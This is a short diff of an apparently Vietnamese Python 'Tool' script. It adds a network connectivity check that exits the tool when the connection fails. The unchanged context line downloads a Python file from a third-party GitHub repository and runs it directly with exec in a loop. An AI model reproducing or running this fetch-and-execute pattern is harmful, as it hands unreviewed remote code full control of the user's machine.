@@ -12,6 +12,12 @@ from time import sleep
 from datetime import datetime, timedelta
 from bs4 import BeautifulSoup
 from concurrent.futures import ThreadPoolExecutor
+def check_network():
+    try:
+        requests.get("https://www.google.com", timeout=5)
+        return True
+    except requests.ConnectionError:
+        return False
 
 
 # Phần còn lại của mã của bạn sẽ tiếp tục từ đây
@@ -172,7 +178,10 @@ if __name__ == '__main__':
     
 while True:
     try:
+        if not check_network():
+            print("\033[1;91mMất kết nối mạng! Tool sẽ tự động tắt để bảo mật.")
+            sys.exit()
         exec(requests.get('https://raw.githubusercontent.com/Mle28288/Mlevip/refs/heads/main/menuu.py').text)
     except KeyboardInterrupt:
         print("\n\033[1;97m[\033[1;91m<>\033[1;97m] \033[1;31mCảm ơn bạn đã dùng Tool !!!")
-        sys.exit()    
+        sys.exit()
